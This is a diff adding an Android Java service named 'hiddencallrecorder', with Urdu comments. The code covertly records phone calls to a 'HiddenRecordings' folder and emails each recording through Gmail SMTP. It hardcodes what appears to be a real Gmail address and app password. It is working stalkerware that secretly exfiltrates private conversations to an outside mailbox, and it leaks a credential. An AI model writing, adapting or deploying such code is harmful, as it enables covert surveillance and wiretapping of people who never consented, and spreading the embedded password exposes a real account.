@@ -1,0 +1,106 @@
+// 📦 پیکیج
+package com.example.hiddencallrecorder;
+
+import android.app.Service;
+import android.content.Context;
+import android.content.Intent;
+import android.media.MediaRecorder;
+import android.os.AsyncTask;
+import android.os.Environment;
+import android.os.IBinder;
+
+import java.io.File;
+import java.text.SimpleDateFormat;
+import java.util.Date;
+import java.util.Locale;
+import java.util.Properties;
+
+import javax.mail.*;
+import javax.mail.internet.*;
+
+// 📞 CallRecorderService: کال ریکارڈ کرنے والی سروس
+public class CallRecorderService extends Service {
+    private MediaRecorder recorder;
+    private File audiofile;
+
+    @Override
+    public IBinder onBind(Intent intent) { return null; }
+
+    @Override
+    public int onStartCommand(Intent intent, int flags, int startId) {
+        try {
+            String timeStamp = new SimpleDateFormat("yyyyMMdd_HHmmss", Locale.getDefault()).format(new Date());
+            File sampleDir = new File(Environment.getExternalStorageDirectory(), "/HiddenRecordings");
+            if (!sampleDir.exists()) sampleDir.mkdirs();
+            audiofile = new File(sampleDir, "Call_" + timeStamp + ".3gp");
+
+            recorder = new MediaRecorder();
+            recorder.setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION);
+            recorder.setOutputFormat(MediaRecorder.OutputFormat.THREE_GPP);
+            recorder.setAudioEncoder(MediaRecorder.AudioEncoder.AMR_NB);
+            recorder.setOutputFile(audiofile.getAbsolutePath());
+            recorder.prepare();
+            recorder.start();
+
+            // 🔁 Gmail پر بھیجنے والا فنکشن
+            GmailSender.sendMail(this, audiofile);
+
+        } catch (Exception e) {
+            e.printStackTrace();
+        }
+
+        return START_STICKY;
+    }
+
+    @Override
+    public void onDestroy() {
+        if (recorder != null) {
+            recorder.stop();
+            recorder.release();
+        }
+    }
+}
+
+// 📩 GmailSender class: Gmail پر ریکارڈنگ بھیجنے والا کوڈ
+class GmailSender {
+    public static void sendMail(Context context, final File fileToSend) {
+        final String username = "mn9503418@gmail.com";
+        final String appPassword = "yzms ncdz veli whtj"; // App Password
+
+        AsyncTask.execute(() -> {
+            Properties props = new Properties();
+            props.put("mail.smtp.auth", "true");
+            props.put("mail.smtp.starttls.enable", "true");
+            props.put("mail.smtp.host", "smtp.gmail.com");
+            props.put("mail.smtp.port", "587");
+
+            Session session = Session.getInstance(props, new javax.mail.Authenticator() {
+                protected PasswordAuthentication getPasswordAuthentication() {
+                    return new PasswordAuthentication(username, appPassword);
+                }
+            });
+
+            try {
+                Message message = new MimeMessage(session);
+                message.setFrom(new InternetAddress(username));
+                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(username));
+                message.setSubject("Call Recording");
+
+                MimeBodyPart messageBodyPart = new MimeBodyPart();
+                messageBodyPart.setText("Attached Call Recording");
+
+                MimeBodyPart attachmentPart = new MimeBodyPart();
+                attachmentPart.attachFile(fileToSend);
+
+                Multipart multipart = new MimeMultipart();
+                multipart.addBodyPart(messageBodyPart);
+                multipart.addBodyPart(attachmentPart);
+
+                message.setContent(multipart);
+                Transport.send(message);
+            } catch (Exception e) {
+                e.printStackTrace();
+            }
+        });
+    }
+}
